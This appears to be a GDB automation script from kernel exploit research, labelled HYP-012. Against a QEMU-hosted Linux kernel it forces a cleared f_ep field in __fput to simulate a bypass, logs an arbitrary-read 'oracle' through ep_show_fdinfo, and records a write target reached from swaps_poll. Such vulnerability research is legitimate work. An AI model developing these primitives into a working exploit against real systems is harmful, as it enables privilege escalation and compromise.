# exp_hyp012_gdb.py — HYP-012: GDB Automation for swaps_poll & Gated Write Primitive
import gdb
import time
import os

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

os.makedirs("evidence/HYP-012", exist_ok=True)
gdb.execute("set logging file evidence/HYP-012/HYP-012_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging enabled on")

def log(msg):
    print(f"[HYP-012-GDB] {msg}", flush=True)

def to_u64(val):
    return int(val) & 0xFFFFFFFFFFFFFFFF

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU on :1234")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

# Tracking state
g_target_inner_file = 0
g_fdinfo_count = 0
g_swaps_poll_count = 0

class FputBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(FputBreakpoint, self).__init__("__fput", internal=False)

    def stop(self):
        file_ptr = to_u64(gdb.parse_and_eval("$x0"))
        try:
            f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            f_count = int(gdb.parse_and_eval(f"*(long*)({file_ptr} + 56)"))
            f_inode = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 32)"))
            f_version = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 184)"))
        except Exception:
            return False

        if f_ep != 0:
            global g_target_inner_file
            g_target_inner_file = file_ptr
            log("=================================================================")
            log(f"[HYP-012] Thread B entered __fput(file={hex(file_ptr)})")
            log(f"  Current state: f_count={f_count}, f_ep={hex(f_ep)}, f_inode={hex(f_inode)}, f_version={hex(f_version)}")
            log("  Simulating Stage-2 fast-path bypass on victim inner_file...")

            gdb.execute(f"set *(unsigned long*)({file_ptr} + 208) = 0")
            new_f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            log(f"  [SIMULATION SUCCESS] file->f_ep is now {hex(new_f_ep)}")
            log("=================================================================")
            self.enabled = False
            return False
        return False

class EpShowFdinfoBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(EpShowFdinfoBreakpoint, self).__init__("ep_show_fdinfo", internal=False)

    def stop(self):
        global g_fdinfo_count
        g_fdinfo_count += 1
        f_epfile = to_u64(gdb.parse_and_eval("$x1"))
        ep_struct = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_epfile} + 200)"))

        log(f"[HYP-012] Hit ep_show_fdinfo (invocation #{g_fdinfo_count}), ep_file={hex(f_epfile)}")
        try:
            rb_root = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 104)"))
            if rb_root != 0:
                epi_file = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({rb_root} + 48)"))
                f_inode = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 32)"))
                if f_inode != 0:
                    i_ino = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_inode} + 64)"))
                    log(f"  AAR Oracle Read: watched file={hex(epi_file)}, f_inode={hex(f_inode)}, i_ino={hex(i_ino)}")
        except Exception as e:
            log(f"  fdinfo inspect error: {e}")
        return False

class SwapsPollBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(SwapsPollBreakpoint, self).__init__("swaps_poll", internal=False)

    def stop(self):
        global g_swaps_poll_count
        g_swaps_poll_count += 1
        x0_file = to_u64(gdb.parse_and_eval("$x0"))
        private_data = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({x0_file} + 200)"))
        log("-----------------------------------------------------------------")
        log(f"[HYP-012] *** SWAPS_POLL HIT *** (invocation #{g_swaps_poll_count})")
        log(f"  file={hex(x0_file)}, private_data={hex(private_data)}")
        log(f"  Target write destination = private_data + 96 = {hex(private_data + 96)}")
        log("-----------------------------------------------------------------")
        return False

bp_fput = FputBreakpoint()
bp_fdinfo = EpShowFdinfoBreakpoint()
bp_swaps = SwapsPollBreakpoint()

log("Breakpoints installed. Continuing execution...")
try:
    gdb.execute("continue")
except gdb.error as e:
    log(f"Continue returned: {e}")

log("Execution completed. Summary:")
log(f"  fdinfo_count={g_fdinfo_count}")
log(f"  swaps_poll_count={g_swaps_poll_count}")
gdb.execute("quit")
